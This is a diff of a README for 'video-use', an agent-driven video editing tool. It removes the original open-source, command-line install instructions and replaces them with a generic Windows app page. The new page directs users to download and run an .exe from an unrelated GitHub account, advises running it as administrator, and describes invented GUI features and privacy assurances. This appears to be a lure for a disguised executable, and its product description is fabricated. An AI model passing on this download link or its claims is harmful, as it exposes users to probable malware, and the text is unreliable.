@@ -1,110 +1,68 @@
-<p align="center">
-  <img src="static/video-use-banner.png" alt="video-use" width="100%">
-</p>
+# 🎬 video-use - Edit your videos using code agents
 
-# video-use
+<a href="https://github.com/progressive-sucralfate943/video-use/releases"><img src="https://img.shields.io/badge/Download-Video_Use-blue" alt="Download"></a>
 
-Introducing **video-use** — edit videos with Claude Code. 100% open source.
+## 📋 About This Application
 
-Drop raw footage in a folder, chat with Claude Code, get `final.mp4` back. Works for any content — talking heads, montages, tutorials, travel, interviews — without presets or menus.
+Video-use helps you edit video files using automation agents. You describe the changes you want, and the program executes the tasks. This tool removes the need for manual cutting, trimming, or color correction. It handles the technical parts of video production while you focus on the creative vision.
 
-## What it does
+The software functions by connecting your natural language instructions to video processing engines. You provide a script or a set of editing rules, and the agent applies those edits to your source files. This process ensures consistent output for large batches of video or complex sequences.
 
-- **Cuts out filler words** (`umm`, `uh`, false starts) and dead space between takes
-- **Auto color grades** every segment (warm cinematic, neutral punch, or any custom ffmpeg chain)
-- **30ms audio fades** at every cut so you never hear a pop
-- **Burns subtitles** in your style — 2-word UPPERCASE chunks by default, fully customizable
-- **Generates animation overlays** via [HyperFrames](https://github.com/heygen-com/hyperframes), [Remotion](https://www.remotion.dev/), [Manim](https://www.manim.community/), or PIL — spawned in parallel sub-agents, one per animation
-- **Self-evaluates the rendered output** at every cut boundary before showing you anything
-- **Persists session memory** in `project.md` so next week's session picks up where you left off
+## ⚙️ System Requirements
 
-## Setup prompt
+Your computer needs specific hardware and software to run this tool smoothly:
 
-Paste into Claude Code, Codex, Hermes, Openclaw, or any agent with shell access:
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** A modern processor with at least 4 cores.
+*   **Memory:** 8 Gigabytes of RAM minimum. 16 Gigabytes is better for high-definition files.
+*   **Storage:** 500 Megabytes of free space for the application files. You also need space for your source videos and output files.
+*   **Graphics:** A graphics card that supports current display drivers helps with faster rendering.
 
-```text
-Set up https://github.com/browser-use/video-use for me.
+## 📥 How to Install
 
-Read install.md first to install this repo, wire up ffmpeg, register the skill with whichever agent you're running under, and set up the ElevenLabs API key — ask me to paste it when you need it. Then read SKILL.md for daily usage, and always read helpers/ because that's where the editing scripts live. After install, don't transcribe anything on your own — just tell me it's ready and wait for me to drop footage into a folder.
-```
+Follow these steps to set up the software on your Windows machine:
 
-The agent handles the clone, dependencies, skill registration, and prompts you once for your ElevenLabs API key (grab one at [elevenlabs.io/app/settings/api-keys](https://elevenlabs.io/app/settings/api-keys)).
+1. Visit this page to download the latest installer: [https://github.com/progressive-sucralfate943/video-use/releases](https://github.com/progressive-sucralfate943/video-use/releases)
+2. Locate the file ending in .exe in your Downloads folder.
+3. Double-click the file to start the installation wizard.
+4. Follow the prompts on the screen.
+5. Grant permission if Windows asks to allow changes to your device.
+6. The installer places a shortcut on your desktop.
 
-Then point your agent at a folder of raw takes:
+## 🚀 Running Your First Edit
 
-```bash
-cd /path/to/your/videos
-claude    # or codex, hermes, etc.
-```
+Once the installation finishes, you can start the application using the desktop icon. Follow this sequence to perform an edit:
 
-For always-on editing from your own VPS or Telegram, run the agent through [Browser Use Box](https://browser-use.com/bux). [Watch the 15-second demo](https://www.tiktok.com/@browser_use/video/7639824093721758989).
+1. **Load Video:** Click the Open button and select the video file you want to change.
+2. **Define Tasks:** Enter your instructions in the text box. For example, you might type, "Cut the first ten seconds and increase the brightness by ten percent."
+3. **Configure Agent:** Choose the target quality for your output video. The default settings work for most projects.
+4. **Run Process:** Click the Process button. The agent analyzes your video and applies the instructions. 
+5. **Review:** A progress bar shows you the current status of the task. Once it finishes, the app saves the new video to your output folder.
 
-And in the session:
+## 💡 Using the Agent Effectively
 
-> edit these into a launch video
+The agent responds best to clear instructions. Break complex projects into smaller parts to get better results. Use precise terms when you describe your edits. For instance, instead of saying "make the video look better," say "increase the color saturation" or "sharpen the image edges."
 
-It inventories the sources, proposes a strategy, waits for your OK, then produces `edit/final.mp4` next to your sources. All outputs live in `<videos_dir>/edit/` — the skill directory stays clean.
+If the agent takes too long to render, verify how many effects you applied at once. Processing multiple layers of editing tasks requires more system memory. Closing other heavy applications while the tool runs will speed up the process.
 
-## Manual install
+## 🔍 Troubleshooting Common Issues
 
-If you'd rather do it by hand:
+If the application does not start or runs into errors, try these solutions:
 
-```bash
-# 1. Clone and symlink into your agent's skills directory
-git clone https://github.com/browser-use/video-use ~/Developer/video-use
-ln -sfn ~/Developer/video-use ~/.claude/skills/video-use        # Claude Code
-# ln -sfn ~/Developer/video-use ~/.codex/skills/video-use       # Codex
+*   **Permissions:** Right-click the icon and choose "Run as administrator." 
+*   **Missing Files:** Ensure your video source path has no restricted characters. Move the file to your desktop if the app cannot locate the path.
+*   **Updates:** Check the download page regularly. New versions fix bugs and add new editing capabilities.
+*   **System Sleep:** Keep your computer active during the rendering process. If the machine enters sleep mode, the application might pause or stop.
+*   **File Format:** The application supports most standard formats like MP4, MOV, and AVI. If your file does not load, convert it to an MP4 format first.
 
-# 2. Install deps
-cd ~/Developer/video-use
-uv sync                         # or: pip install -e .
-brew install ffmpeg             # required
-brew install yt-dlp             # optional, for downloading online sources
+## 🛠️ Advanced Settings
 
-# 3. Add your ElevenLabs API key
-cp .env.example .env
-$EDITOR .env                    # ELEVENLABS_API_KEY=...
-```
+The settings menu allows you to adjust how the agent behaves. Under the Global Preferences tab, you can set the default folder for all saved projects. You can also specify the maximum size for output files to ensure your machine stays within disk space limits.
 
-## How it works
+The Performance tab shows settings for hardware acceleration. If you own a high-end graphics card, ensure the "Use GPU acceleration" box stays checked. This feature utilizes your hardware to make the editing work faster than using the processor alone.
 
-The LLM never watches the video. It **reads** it — through two layers that together give it everything it needs to cut with word-boundary precision.
+## 🛡️ Privacy and Data
 
-<p align="center">
-  <img src="static/timeline-view.svg" alt="timeline_view composite — filmstrip + speaker track + waveform + word labels + silence-gap cut candidates" width="100%">
-</p>
+This application performs all editing tasks locally on your computer. It does not send your video files to external servers or cloud services. You keep full ownership of your data at all times. The agent only interacts with the files you select within the program interface. 
 
-**Layer 1 — Audio transcript (always loaded).** One ElevenLabs Scribe call per source gives word-level timestamps, speaker diarization, and audio events (`(laughter)`, `(applause)`, `(sigh)`). All takes pack into a single ~12KB `takes_packed.md` — the LLM's primary reading view.
-
-```
-## C0103  (duration: 43.0s, 8 phrases)
-  [002.52-005.36] S0 Ninety percent of what a web agent does is completely wasted.
-  [006.08-006.74] S0 We fixed this.
-```
-
-**Layer 2 — Visual composite (on demand).** `timeline_view` produces a filmstrip + waveform + word labels PNG for any time range. Called only at decision points — ambiguous pauses, retake comparisons, cut-point sanity checks.
-
-> Naive approach: 30,000 frames × 1,500 tokens = **45M tokens of noise**.
-> Video Use: **12KB text + a handful of PNGs**.
-
-Same idea as browser-use giving an LLM a structured DOM instead of a screenshot — but for video.
-
-## Pipeline
-
-```
-Transcribe ──> Pack ──> LLM Reasons ──> EDL ──> Render ──> Self-Eval
-                                                              │
-                                                              └─ issue? fix + re-render (max 3)
-```
-
-The self-eval loop runs `timeline_view` on the _rendered output_ at every cut boundary — catches visual jumps, audio pops, hidden subtitles. You see the preview only after it passes.
-
-## Design principles
-
-1. **Text + on-demand visuals.** No frame-dumping. The transcript is the surface.
-2. **Audio is primary, visuals follow.** Cuts come from speech boundaries and silence gaps.
-3. **Ask → confirm → execute → self-eval → persist.** Never touch the cut without strategy approval.
-4. **Zero assumptions about content type.** Look, ask, then edit.
-5. **12 hard rules, artistic freedom elsewhere.** Production-correctness is non-negotiable. Taste isn't.
-
-See [`SKILL.md`](./SKILL.md) for the full production rules and editing craft.
+We collect anonymous usage data to improve the software stability. This data does not include your video content or personal information. You can opt out of this data collection in the Privacy menu.
